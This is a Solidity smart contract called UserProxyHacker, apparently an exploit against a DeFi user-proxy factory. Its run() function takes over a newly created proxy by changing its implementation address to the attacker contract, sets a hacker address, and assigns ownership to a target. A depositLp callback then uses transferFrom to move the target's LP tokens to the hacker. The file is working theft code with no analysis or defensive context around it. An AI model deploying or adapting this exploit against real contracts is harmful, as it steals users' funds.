// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;
interface IERC20 {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IUserProxyInterface {
    function depositLp(address, uint) external;
}

interface IUserProxyFactory {
    function createAndGetUserProxy(address) external returns (address);
}

interface IUserProxy {
    function updateImplementationAddress(address _implementationAddress) external;
    function updateOwnerAddress(address _ownerAddress) external;
}

interface IUserProxyHacker{
    function setHacker(address) external;
}

contract UserProxyHacker {

    address public _hacker;

    event GotLP(address token, address hacker, uint256 amount);

    function setHacker(address hacker) external {
        _hacker = hacker;
    }

    function run(address userProxyFactory, address userProxyInterface, address hacker, address target, address token, uint amount) public {        
        // Create UserProxy.
        IUserProxyInterface(userProxyInterface).depositLp(token, 0);
        
        // Get UserProxy
        address ourUserProxy = IUserProxyFactory(userProxyFactory).createAndGetUserProxy(address(this));

        // Change impl
        IUserProxy(ourUserProxy).updateImplementationAddress(address(this));

        // Set hacker address.
        IUserProxyHacker(ourUserProxy).setHacker(hacker);

        // Set owner to target
        IUserProxy(ourUserProxy).updateOwnerAddress(target);

        // Call depositLp, will callback to depositLp of this address
        IUserProxyInterface(userProxyInterface).depositLp(token, amount);
    }

    function depositLp(address token, uint256 amount) public {
        IERC20(token).transferFrom(msg.sender, _hacker, amount);
        emit GotLP(token, _hacker, amount);
    }
}